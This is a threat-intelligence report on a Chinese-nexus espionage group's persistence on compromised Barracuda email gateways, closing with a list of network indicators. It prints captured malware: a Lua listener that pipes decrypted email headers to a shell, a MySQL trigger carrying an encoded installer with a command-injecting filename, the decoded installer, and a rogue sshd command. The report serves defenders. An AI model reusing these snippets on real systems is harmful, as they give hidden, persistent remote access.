=== Content from www.mandiant.com_050d5cc3_20250115_221448.html ===
Threat Intelligence
# Diving Deep into UNC4841 Operations Following Barracuda ESG Zero-Day Remediation (CVE-2023-2868)

August 29, 2023

##### Mandiant

Written by: Austin Larsen, John Palmisano, John Wolfram, Mathew Potaczek, Michael Raggi

---

*UPDATE (Aug. 21, 2024): This post has been updated to remove four indicators of compromise (IOC) in the Domains section. Based on further research, we have determined that there was insufficent evidence to confirm if these IOCs were related to this campaign.*

On June 15, 2023, Mandiant released [a blog post](https://cloud.google.com/blog/topics/threat-intelligence/barracuda-esg-exploited-globally) detailing an 8-month-long global espionage campaign conducted by a Chinese-nexus threat group tracked as UNC4841. In this follow-up blog post, we will detail additional tactics, techniques, and procedures (TTPs) employed by UNC4841 that have since been uncovered through Mandiant’s incident response engagements, as well as through collaborative efforts with Barracuda Networks and our International Government partners.

Over the course of this blog post, Mandiant will detail how UNC4841 has continued to show sophistication and adaptability in response to remediation efforts. Specifically, UNC4841 deployed new and novel malware designed to maintain presence at a small subset of high priority targets that it compromised either before the patch was released, or shortly following Barracuda’s remediation guidance. We’ll also showcase how UNC4841’s deployment select backdoors suggests this threat actor anticipated, and prepared for remediation efforts, by creating tooling in advance to remain embedded in high-value targets, should the campaign be compromised.

Furthermore, Mandiant will provide additional insights into the overall campaign timeline as well as a deeper look into UNC4841’s targeting, as observed through investigations at downstream customers, further strengthening the case for ties between UNC4841 and the People’s Republic of China.

Since Barracuda [released](https://www.barracuda.com/company/legal/esg-vulnerability) a patch to ESG appliances on May 20, 2023, Mandiant and Barracuda have not identified evidence of successful exploitation of CVE-2023-2868 resulting in any newly compromised physical or virtual ESG appliances. Only a limited number of ESG appliances worldwide were compromised (5% of ESG appliances), and impacted customers have been notified to replace the appliances. No other Barracuda product, including Barracuda’s SaaS email solutions, were impacted by this vulnerability.

Mandiant and Barracuda investigations into previously compromised appliances confirmed UNC4841 deployed additional malware to a subset of devices and conducted additional post-exploitation activities.

Mandiant assesses that, at the time of writing, a limited number of previously impacted victims remain at risk due to this campaign. UNC4841 has shown an interest in a subset of priority victims - it is on these victim’s appliances that additional malware, such as the backdoor DEPTHCHARGE, was deployed to maintain persistence in response to remediation efforts. Mandiant and Barracuda have reached out to individual victims where such activity has been identified. Mandiant’s recommendations remain unchanged — victims impacted by this campaign should contact Barracuda [support](https://www.barracuda.com/support/contact) and replace the compromised appliance.

## Campaign Timeline

Since our initial blog post, Mandiant has assembled and analyzed an exhaustive timeline of all identified UNC4841 activity observed at victims impacted by the successful exploitation of CVE-2023-2868. As depicted in Figure 1, the campaign spanned the timeframe between October 2022 and June 2023, with an initial surge of CVE-2023-2868 exploitation activity occurring in early November 2022.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig1_zaee.max-1400x1400.png)

Figure 1: Identified UNC4841 activity (blue) and victims (red) over the duration of the campaign

Through our analysis of the campaign, Mandiant identified a distinct fall off in activity from approximately January 20 to January 22, 2023, a period that coincides with the beginning of the Chinese New Year — a national holiday observed within the People’s Republic of China. Additionally, further analysis of the timeline identified two surges in activity that followed Barracuda’s initial remediation efforts and public notification on May 23, 2023. The first surge occurred in the days immediately following the notification, where the actor retooled malware and changed persistence methods as detailed in our previous blog. This was followed by a second, previously undisclosed wave, that began in early June 2023. In this second wave, Mandiant discovered the actor attempting to maintain access to compromised environments via the deployment of the new malware families SKIPJACK, DEPTHCHARGE, and FOXTROT / FOXGLOVE. This second surge represented the highest intensity of UNC4841 activity identified by Mandiant across the entire campaign, demonstrating UNC4841’s determination in preserving access to specific victim environments.

## Targeted Tooling

UNC4841 is a well-resourced actor that has utilized a wide range of malware and purpose-built tooling to enable their global espionage operations. One theme that has become apparent as our investigation has progressed is the selective deployment of specific malware families at high priority targets. The three code families we have observed being selectively deployed are SKIPJACK, DEPTHCHARGE, and FOXTROT / FOXGLOVE. Each of these malware families represent a level of increasing selectivity in their deployment.

### SKIPJACK

SKIPJACK is a passive backdoor implemented by trojanizing legitimate Barracuda ESG modules by injecting malicious Lua code. Through the injected code, SKIPJACK establishes its backdoor capabilities by registering a listener for specific incoming email headers and subjects, and then decoding and executing the content of them. Mandiant has observed variations of SKIPJACK that utilize both the Content-ID and X-Barracuda-Spam-Info email header fields, an example of which can be seen in the following code snippet.

```
if hdr:name() == "Content-ID" then
        if hdr:body() ~= nil then
                if string.match(hdr:body(), "^[%w%+/=\r\n]+$") then
                        io.popen("echo " " .. hdr:body() .. "" | openssl aes-256-cbc -d -A -a -nosalt -K <REDACTED> -iv <REDACTED> 2>/dev/null | base64 -d | sh 2>/dev/null"):close()
                End
        end
end
```
Figure 2: SKIPJACK Listener

As observed in the code snippet, the injected SKIPJACK code inspects whether the Content-ID header exists, and that it contains characters that would be present in a Base64 encoded string. When the condition is met, it proceeds to AES-256 decrypt and Base64 decode the header body, and then pipe the output to a system shell for execution.

Around the time of Barracuda's initial notification regarding CVE-2023-2868, Mandiant observed UNC4841 creating bash scripts on previously compromised appliances with the filename of `mknod` in the path `/boot/os\_tools/`. The `mknod` bash script checks whether the `mod\_content.lua` script on the compromised appliance contains the string `OpenSSL`, and if not found, injects the code snippet in Figure 2 into the mod\_content.lua script, effectively backdooring the legitimate Barracuda ESG module.

Of these three malware families, UNC4841 most widely deployed SKIPJACK, which was observed on roughly 5.8 percent of all compromised ESG appliances. UNC4841 primarily targeted government and technology organizations with SKIPJACK; however, multiple other verticals were observed being targeted.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig3-img.max-800x800.png)

Figure 3: SKIPJACK sector distribution

Additionally, of all the malware families deployed by UNC4841 in this campaign, Mandiant found that SKIPJACK had the most variants. Although we identified evidence of many different SKIPJACK bash scripts existing on compromised appliances, we were not able to recover all instances of the malware. Based on the samples we did obtain, we suspect that each of these unrecovered variants contained different SKIPJACK code that utilized different sections within an email message to hide its encrypted command and achieve the same functionality.

### DEPTHCHARGE

Another malware family Mandiant observed being selectively deployed by UNC4841 was a passive backdoor we named DEPTHCHARGE. DEPTHCHARGE, which is [tracked by CISA as SUBMARINE](https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors), is packaged as a Linux shared object library, which is pre-loaded into the Barracuda SMTP (BSMTP) daemon using LD\_PRELOAD. DEPTHCHARGE listens passively to receive encrypted commands, which it decrypts with OpenSSL and executes before sending the results, masqueraded as SMTP commands, back to the command and control (C2) server. DEPTHCHARGE is installed and persisted through a complex execution chain, which the actor crafted to enable infection of re-issued or clean appliances when the victim restored backup configurations from a previously compromised device. Figure 4 provides a depiction of the DEPTHCHARGE execution chain.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig4a_ifzz.max-1300x1300.png)

Figure 4: DEPTHCHARGE execution chain

The first stage of the DEPTHCHARGE execution chain existed in a file named `config.TRG`, which defines a malicious trigger (named `cuda` or `cuda\_trigger`) in the MySQL database that stores the configuration for the Barracuda ESG appliance.

```
TYPE=TRIGGERS
triggers='CREATE TRIGGER cuda\nBEFORE DELETE ON config\nFOR EACH ROW\nBEGIN\n    DECLARE i INT;\n    SET i = 1;\n    IF i = 1 THEN\n        SELECT "<base64_payload>” INTO OUTFILE "/var/tmp/r";\n        SELECT "echo
-n Y2F0IC92YXIvdG1wL3IgfCBiYXNlNjQgLWQgLWkgfCB0YXIgLXp4IC1DIC92YXIvdG1wCm5va
HVwIGJhc2ggL3Zhci90bXAvcnVuLnNoICAgMzExNTMgICAgPi9kZXYvbnVsbCAyPiYxICYKcm0gLWYgL3Jvb3QvbWFjaGluZVxgKg== | base64 -d | sh" INTO OUTFILE "/root/machine`echo -n Y2htb2QgK3ggL3Jvb3QvbWFjKlxgKgpzaCAvcm9vdC9tYWMqXGAq | base64 -d |sh`|";\n        SET i = i + 1;\n    END IF;\nEND'
sql_modes=0
definers='root@localhost'
```
Figure 5: DEPTHCHARGE trigger

```
cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp
nohup bash /var/tmp/run.sh   31153    >/dev/null 2>&1 &
rm -f /root/machine\`*
```
Figure 6: DEPTHCHARGE decoded installer script

The trigger is executed before a row is removed from the configuration database, an action which occurs frequently and at the time of restoration of a previous Barracuda ESG configuration. The first part of the trigger writes a Base64 payload to `/var/tmp/r`; a TAR archive that contains an installer shell script and the final DEPTHCHARGE backdoor payload. The remaining components of the trigger write a script to disk that decompresses this archive, run the installer script inside, and then remove the file on disk. However, it is not possible to execute a script directly from the MySQL trigger. Therefore, in order to execute the installer script, UNC4841 specially crafted a filename that would cause other components of the Barracuda ESG’s codebase that used the [two-argument form of Perl’s open( ) function](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543) to execute commands (shown inside the backticks). Ultimately, this novel approach enabled UNC4841 to achieve command execution from the MySQL trigger and launch the DEPTHCHARGE script. The fact that UNC4841 identified and operationalized this complex execution path suggests that they had extensive knowledge of the device and had researched internal components of the Barracuda ESG appliance.

The installer script `run.sh` is executed with an argument that specifies the DEPTHCHARGE `BSMTP\_ID` configuration value (discussed as follows). The script is responsible for moving the DEPTHCHARGE payload to a legitimate directory on the appliance, and modifying the SMTP configuration file to pre-load the malware with the given BSMTP\_ID configuration value upon execution of the BSMTP daemon. It also creates additional scripts that sleep for two minutes prior to execution, check if the pre-load persistence is present, and install it into the SMTP configuration file if it is not found. To further blend into legitimate activity, some variants of the script were also found to timestomp the malware files by inheriting timestamps from legitimate files on the system using the `touch` command.

The DEPTHCHARGE backdoor can accept incoming TCP connections. It checks if the TCP source port of the client is equal to the value in the `BSMTP\_ID` environment variable, and if so executes its backdoor capability as a Linux daemon. DEPTHCHARGE first connects to the appliance's SMTP port (127.0.0.1:25) to retrieve the appliance’s genuine SMTP banner, which it sends back to the attacker. This is likely used as an SMTP greeting message and to verify the identity of the appliance to which they are connecting.

The malware is then able to receive encrypted commands that masquerade as SMTP EHLO commands, which are preceded with the string “ehlo” followed by a space. The encrypted commands are base64 decoded and AES decrypted with OpenSSL before being executed. The malware sends the results back to the attacker, again masquerading it as SMTP traffic:

```
250-mail2.eccentric.duck Hello <command body> [<client's IP address string>], pleased to meet you
250-SIZE 100000000
250-PIPELINING
250-8BITMIME
250 HELP
```
Figure 7: DEPTHCHARGE SMTP greeting

The SMTP reply sent by DEPTHCHARGE in response to a SMTP EHLO command contains the local hostname of “mail2.eccentric.duck”. This hostname is a hardcoded string and does not relate to any public registered domain name.

It was common practice for impacted victims to export their configuration from compromised appliances so it could be restored into a clean one. Therefore, if the DEPTHCHARGE trigger was present in the exported configuration, it would effectively enable UNC4841 to infect the clean device with the DEPTHCHARGE backdoor through this execution chain, and potentially maintain access even after complete replacement of the appliance. Mandiant and Barracuda Networks identified instances where this may have occurred and notified victims accordingly. Additionally, Mandiant is aware that in some cases, this MySQL configuration database may contain plaintext passwords for user accounts. In these instances, we suspect the actor was harvesting these credentials for lateral movement purposes.

The earliest evidence of UNC4841 deploying DEPTHCHARGE occurred on May 30, 2023, roughly one week after Barracuda’s initial notification. Mandiant observed UNC4841 rapidly deploy DEPTHCHARGE to select targets following Barracuda’s announcement that RMA was the recommended response action. This capability and its deployment suggests that UNC4841 anticipated and was prepared for remediation efforts with tooling and TTPs designed to enable them to persist on high value targets. It also suggests that despite this operation's global coverage, it was not opportunistic, and that UNC4841 had adequate planning and funding to anticipate and prepare for contingencies that could potentially disrupt their access to target networks. Over the course of the investigation to date, Mandiant has identified UNC4841 deploying DEPTHCHARGE to roughly 2.64 percent of compromised appliances. These victims included U.S. and foreign government entities, as well as high tech and information technology providers.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig7-img.max-800x800.png)

Figure 8: DEPTHCHARGE sector distribution

### FOXTROT / FOXGLOVE

The final malware family Mandiant observed being selectively deployed by UNC4841 was FOXTROT / FOXGLOVE. FOXGLOVE is a launcher written in C that executes the hardcoded path of FOXTROT. The payload is executed along with additional encrypted arguments for the C2, port, secret key, and jitter. FOXGLOVE uses a combination of Base64, Mod(13), and XOR with a hard-coded key to encrypt arguments.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig8_ckxu.max-1000x1000.png)

Figure 9: FOXGLOVE encryption routine

FOXGLOVE is implemented to be configurable, as the execution path and arguments can easily be changed.

```
/usr/share/foxdoor/foxdoor_shell shell -t <Encrypted C2> -p <Encrypted Port> -s <Encrypted Secret> -r <Jitter>
```
Figure 10: FOXGLOVE execution

FOXTROT is a backdoor written in C++ that communicates via TCP and is able to be used as a proxy. Supported backdoor commands include keystroke capture, shell command execution, reverse shell creation, and file transfer.

FOXTROT contains overlaps to [REPTILE shell open source code](https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/userland/shell.c). FOXTROT notably makes use of the [default sequence](https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/userland/include/config.h#L11C1-L11C34) `;7(Zu9YTsA7qQ#vw` as an acknowledgement token, and to signal session termination. FOXTROT, however, also includes backdoor commands and functionality not present in REPTILE.

FOXTROT and FOXGLOVE are also notable in that they are the only malware families observed being used by UNC4841 that were not specifically designed for Barracuda ESGs. Based on functionality, FOXTROT was likely also intended to be deployed to other Linux-based devices within a network to enable lateral movement and credential theft. Additionally, FOXGLOVE and FOXTROT were the most selectively deployed of all the malware families used by UNC4841. At this time, Mandiant has only observed UNC4841 deploy FOXTROT and FOXGLOVE at government or government related organizations that were high priority targets for the PRC.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig10-img.max-800x800.png)

Figure 11: FOXTROT / FOXGLOVE sector distribution

## Lateral Movement

Following Barracuda’s public disclosure of CVE-2023-2868, Mandiant identified UNC4841 performing internal reconnaissance and subsequent lateral movement actions within a limited number of victim environments.

On May 16, 2023, Mandiant observed the first evidence of UNC4841 attempting to perform internal reconnaissance on a small number of victims' internal networks in which Mandiant was responding. In these cases, the actor utilized open-source tools such as fscan to perform host detection, port scanning, web fingerprint identification, web vulnerability scanning, domain control identification, and other reconnaissance actions. In one environment, the actor scanned more than 50 subnets over the course of nine days, with approximately 80 percent of these being completed in one day. Figure 12 shows an example output from the fscan tool recovered from a compromised ESG appliance.

```
<redacted>::25 open
<redacted>:25 open
<redacted>:587 open
<redacted>:443 open
[*] NetInfo:
[*]<redacted>
   [->]<redacted>
   [->]<redacted>
[*] WebTitle: https://<redacted>       code:200 len:701    title:IIS Windows Server
<redacted>:25 open
<redacted>:443 open
[*] LiveTop <redacted>/16     段存活数量为: 65
[*] LiveTop <redacted>/16     段存活数量为: 26
[*] LiveTop <redacted>/16     段存活数量为: 13
<redacted>:25 open
<redacted>:587 open
<redacted>:53 open
<redacted>:389 open
```
Figure 12: fscan output

In addition to the reconnaissance actions, Mandiant also observed UNC4841 attempting to move laterally from impacted ESG appliances within this same time period. Based on the activity observed over the course of the investigation, Mandiant believes UNC4841 was likely utilizing the contents of messages stored within the mstore, a temporary storage location on the ESG, to harvest credentials. In multiple instances, Mandiant identified cleartext credentials contained within the contents of messages stored on the ESG that UNC4841 subsequently used to successfully access the account through Outlook Web Access (OWA) on the first attempt.

In more than one case, Mandiant observed UNC4841 utilizing OWA to attempt to log in to mailboxes for users within the victim organization. In one case, a relatively low number of unsuccessful OWA access attempts resulted in the lockout of a limited number of accounts. In the cases where UNC4841 was able to obtain unauthorized access to a limited number of accounts, Mandiant did not observe UNC4841 send any email from the compromised account. Mandiant assesses that UNC4841 was likely attempting to maintain access to compromised users’ mailboxes to gather information for espionage purposes post Barracuda remediation.

In addition to attempts to move laterally to Active Directory and OWA, Mandiant also observed attempts by UNC4841 to move laterally via SSH to VPNs, Proxy Servers, and other edge appliances on the victims network.

Mandiant also identified accounts created by UNC4841 within the etc/passwd file on roughly five percent of the previously impacted appliances, as another form of remote access. Account names followed a consistent format, containing four (4) randomly generated characters. The actor would then spawn a ssh daemon process to listen on a specific high port and allow login from this newly created user account as another means to maintain backdoor access to compromised appliances. An example of the command is shown as follows:

/usr/sbin/sshd -p 48645 -oAllowUsers=rfvN

In one case, Mandiant identified UNC4841 successfully accessing a Windows Server Update Services (WSUS) server utilizing a domain administrator account identified within the mstore on an ESG appliance. The access to WSUS is notable as Mandiant has observed other China-nexus espionage actors deploying malware on a WSUS server to inject fake updates for remote code execution in efforts to steal data from government entities.

## Targeting

In the two months since our introduction of UNC4841, Mandiant has also come to better understand UNC4841’s targeting of ESG appliances and their primary targets based on their selectivity in follow-on operations. Overall, Mandiant has observed targeted organizations across public and private sectors worldwide appear to be impacted by UNC4841 tools. While the majority of exploitation activity appears to impact the Americas, that may partially reflect the product’s customer base (Figure 13).

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png)

Figure 13: Affected organizations by region

Organizations observed to be impacted by UNC4841 sit in a wide variety of verticals, with the primary targets including national governments, high tech and information technology entities, local governments, telecommunications providers, manufacturing entities, and colleges and universities. Twenty six specific verticals were observed that spanned a broad spectrum of functions (Figure 14). Noteworthy sectors that were included in minority targeted segments included healthcare and biotechnology, public health, aerospace and defense, and semiconductors.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png)

Figure 14: Sector breakdown, percentage of impacted organizations

Almost a third of identified affected organizations were government agencies. As stated in Mandiant’s earlier publication, shell scripts were uncovered that targeted email domains and users from ASEAN Ministry of Foreign Affairs, as well as foreign trade offices and academic research organizations in Taiwan and Hong Kong. In addition, the actors searched for email accounts belonging to employees of a government with political or strategic interest to the PRC while this victim government was participating in high-level, diplomatic meetings with other countries. This suggests targeted exfiltration was prioritized for specific high value geopolitical and economic users. A distinct prioritization of government agencies alongside high tech and information technology targets was also observed when examining UNC4841 tools deployed following Barracuda’s patching and initial disclosure of CVE-2023-2868. These factors support the assessment that the campaign had an espionage motivation.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png)

Figure 15: Government agencies worldwide appear to have been disproportionately targeted

Following Barracuda’s announcement regarding CVE-2023-2868 and remediation efforts on May 23, 2023, new malware was deployed by the threat actor beginning on May 22, 2023. These malware families included SKIPJACK, DEPTHCHARGE, FOXGLOVE, FOXTROT, and a new version of SEASPY tracked as SEASPY V2. The first new payload observed was SEASPY v2 on May 22, 2023, followed by DEPTHCHARGE, FOXGLOVE, and FOXTROT from May 30, 2023 through early June. Interestingly, organizations that received these post-remediation malware families were weighted towards government (national), high tech, and information technology sectors. This may suggest a threat actor prioritization towards conventional espionage targets, and maintaining access to IT and managed service providers.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png)

Figure 16: Post-remediation UNC4841 malware deployment by sector

Notably, among North American identified affected organizations, there were numerous state, provincial, county, tribal, city, and town offices that were targeted in this campaign. These organizations included municipal offices, law enforcement offices, judiciaries of varying levels, social service offices, and several incorporated towns. While overall local government targeting comprises just under seven percent of all identified affected organizations, this statistic increases to nearly seventeen percent when compared to U.S.-based targeting alone. In some instances, targeted entities had populations below 10,000 individuals. Local government targeting occurred mostly in the initial months of CVE-2023-2868 exploitation, with the majority of observed compromises beginning from October through December 2022. The volume of local government organizations impacted by UNC4841 post-remediation tools has since fallen to only 8 percent of observed impacted organizations. This decline may represent an evolving operational priority for UNC4841 over the duration of sustained threat activity.

Regional information technology providers in the United States and Europe experienced a statistically notable volume of targeting among early instances of exploitation in which SALTWATER, SEASPY, and SEASIDE were delivered. These payloads were delivered as part of the initial compromise by UNC4841 without further actions on objectives carried out on the infected device. Mandiant does not maintain thorough visibility into adversary actions during the earlier stages of the campaign. However, we note that several indications were discovered during incident response, which demonstrate the actors were removing traces of their malicious activity on impacted devices. A possible conclusion of these three malware families being observed in isolation is adversaries have not yet prioritized the infected appliances for further compromise and deployment of later stage tools attributed to UNC4841. Alternatively, we recognize that subsequent tooling and indications of malicious activity may have been removed by the actors prior to the start of remediation engagements.

From October 2022 to February 2023, the heightened volume of impacted IT and MSP providers with solely the initial payloads delivered may have been an attempt by UNC4841 to establish an initial foothold within this type of Barracuda ESG environment. Few of these impacted targets received later stage payloads or were associated with targeted commands that sought to exfiltrate data pertaining to specific users. Mandiant assesses with low confidence that this may suggest these organizations were targeted in an attempt to maximize access to domains managed by Barracuda ESG servers, rather than the IT providers being the intended final target of exploitation. Barracuda ESG allows the management of numerous email domains for the scanning of inbound email attachments, and information technology providers and managed service providers may be positioned to manage a greater variety of downstream customer email domains when compared to a single enterprise server. Additionally, as previously noted, high tech and information technology providers were the second most targeted sector by UNC4841 post-remediation tooling.

A deeper examination of identified affected organizations showed a recurring targeting of sectors that are key to global governments maintaining a competitive technological and economic edge in the face of impending strategic state deadlines. Entities were observed within the semiconductor, public health, aerospace, artificial intelligence/autonomous vehicles, and rare earth metal production sectors. Further, religious based organizations were impacted by UNC4841 campaigns. A cluster of organizations with mission-based aid or stated evangelical missions that impact China (and Chinese claimed geographies such as Hong Kong and Taiwan) were observed being targeted with the initial stages of malware utilized by this threat actor. Unlike numerous impacted organizations that align with traditional espionage requirements, these entities only received early stage implants such as SALTWATER, SEASPY, and SEASIDE. This may suggest a lower priority among UNC4841 collection requirements with evidence of deeper compromise, persistence, and exfiltration being observed among entities aligning with more conventional geopolitical, defense, and technology related mandates.

Based on the evidence available at the time of analysis, earliest compromises appear to have occurred on a small subset of appliances geolocated to mainland China. The C2 communications utilized during this early set of compromises also leveraged port 8080, while later compromises that occurred globally almost entirely leveraged port 443 or port 25.

## Attribution

Mandiant has previously assessed with high confidence that UNC4841 conducts espionage activity in support of the People’s Republic of China. Our assessment has not changed and has now been corroborated by independent assessments from [government agencies](https://www.ic3.gov/Media/News/2023/230823.pdf). As we mentioned in our first blog post, several overlaps with other China-nexus actors have been identified throughout our investigation. However, Mandiant has not attributed activity tracked as UNC4841 to a previously known threat actor.

### Higher-level Trends in Chinese Cyber Espionage Operations

Early in our investigation, we identified overlaps in infrastructure used by UNC4841 with that which we have associated with UNC2286, another China-nexus actor that we have observed active since at least 2019 and which has heavily targeted organizations in the Southeast Asia region. Activity Mandiant has attributed to UNC2286 overlaps with public reporting on [GhostEmperor](https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/) (Kaspersky) and [FamousSparrow](https://www.eset.com/int/about/newsroom/press-releases/research/eset-research-discovers-famoussparrow-apt-group-spying-on-hotels-governments-and-private-companies/) (ESET). While this finding does indicate a connection in the infrastructure used by both groups, it is likely an artifact of a shared infrastructure anonymization service or an infrastructure provider that is common between them.

Additionally, Mandiant has recently observed another sophisticated espionage focused China-nexus actor, UNC3886, deploying custom malware based on modified REPTILE source code - similar to FOXTROT. A recent UNC3886 campaign leveraged[a zero-day exploit for Fortinet appliances](https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem) as well as an ecosystem of custom malware which included UNC3886’s backdoor CASTLETAP, which is adapted from REPTILE and designed to be utilized on FortiGate appliances. CASTLETAP achieves functionality similar to SEASPY and is also designed to passively listen for magic packets that activate the backdoor functionality and connect back to a C2 server with SSL encryption. Other malware families deployed by UNC3886 have also shown similar characteristics to those deployed by UNC4841. For example, DRIEDMOAT is another similar passive backdoor that has been observed with an embedded certificate stolen from the compromised appliance that it uses to encrypt its C2 communications, much like the [technique we observed from UNC4841](https://cloud.google.com/blog/topics/threat-intelligence/barracuda-esg-exploited-globally#:~:text=Infrastructure%20used%20by,to%20Barracuda%20infrastructure.).

Shared infrastructure and techniques for anonymization are common amongst Chinese cyber espionage actors, as is shared tooling and likely malware development resources. Mandiant assesses that these observations are evidence of the higher level trends we have observed in [Chinese cyber espionage](https://cloud.google.com/blog/topics/threat-intelligence/chinese-espionage-tactics) and the evolution toward more purposeful, stealthy, and effective operations that avoid detection and complicate attribution. It is likely that we will continue to observe Chinese cyber espionage operations targeting edge infrastructure with zero-day vulnerabilities and the deployment of malware customized to specific appliance ecosystems.

## Outlook and Implications

Over the course of the investigation, UNC4841 has proven to be highly responsive to defensive efforts and has actively modified TTPs to maintain access within victim environments to continue their espionage operation. Mandiant strongly recommends impacted Barracuda customers continue to hunt for UNC4841 activity within networks impacted by a compromised ESG. Due to their demonstrated sophistication and proven desire to maintain access, Mandiant expects UNC4841 to continue to alter their TTPs and modify their toolkit as network defenders continue to take action against this adversary, and their activity is further exposed by the security community. Mandiant anticipates UNC4841 will continue to target edge devices in the future. In order to aid in the hunting UNC4841 activity, IOCs and detection rules can be found in the sections that follow.

If you were impacted by this campaign, Mandiant recommends you contact the FBI at sf-barracudacve@fbi.gov.

## Acknowledgements

We would like to thank the U.S. Cybersecurity & Infrastructure Security Agency (CISA) for their continued partnership and contributions to this report, as well as the Federal Bureau of Investigation (FBI) for their on-going collaboration and assistance in notifying impacted organizations. We would also like to thank the Australian Signals Directorate’s (ASD) Australian Cyber Security Centre (ACSC) for assistance in notifying victims. Additionally, we would like to thank Barracuda Networks for their decisive actions, transparency and partnership following the exploitation of CVE-2023-2868 by UNC4841.

## Indicators of Compromise (IOCs)

### Network IOCs

| **IP Address** | **ASN** | **NetBlock** | **Location** |
| --- | --- | --- | --- |
| 101.229.146.218 | 4812 | China Telecom | CN |
| 103.146.179.101 | 136933 | Gigabitbank Global | HK |
| 103.27.108.62 | 132883 | Topway Global Limited | HK |
| 103.77.192.87 | 10222 | Multibyte Info Technology Limited | HK |
| 103.146.179.69 | 10222 | Multibyte Info Technology Limited | HK |
| 103.77.192.13 | 10222 | Multibyte Info Technology Limited | HK |
| 103.77.192.88 | 10222 | Multibyte Info Technology Limited | HK |
| 103.93.78.142 | 61414 | Edgenap Ltd | JP |
| 104.156.229.226 | 20473 | Choopa, LLC | US |
| 104.223.20.222 | 8100 | CloudVPS | US |
| 107.148.149.156 | 399195 | Pegtechinc-ap-04 | US |
| 107.148.219.227 | 54600 | Peg Tech | US |
| 107.148.219.53 | 54600 | Peg Tech | US |
| 107.148.219.54 | 54600 | Peg Tech | US |
| 107.148.219.55 | 54600 | Peg Tech | US |
| 107.148.223.196 | 54600 | Peg Tech | US |
| 107.173.62.158 | 20278 | Nexeon Technologies | US |
| 113.52.106.3 | 4609 | Companhia de Telecomunicacoes de Macau SARL | HK |
| 137.175.19.25 | 54600 | Peg Tech | US |
| 137.175.28.251 | 54600 | Peg Tech | US |
| 137.175.30.36 | 54600 | Peg Tech | US |
| 137.175.30.86 | 54600 | Peg Tech | US |
